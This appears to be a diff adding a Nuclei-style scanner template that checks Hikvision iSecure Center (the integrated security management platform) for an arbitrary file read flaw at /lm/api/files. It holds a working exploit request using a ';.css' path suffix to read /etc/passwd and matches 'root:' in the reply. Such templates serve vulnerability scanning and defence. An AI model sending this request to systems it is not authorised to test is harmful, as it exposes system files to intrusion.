@@ -1,0 +1,29 @@
+id: Hikvision-lm-fileread
+
+info:
+  name: 综合安防管理平台 iSecure Center /lm/api/files 任意文件读取
+  author: unknown
+  severity: high
+  description: 综合安防管理平台 iSecure Center /lm/api/files存在任意文件读取漏洞
+  tags: files-upload
+  
+http:
+  - raw:
+      - |
+        GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
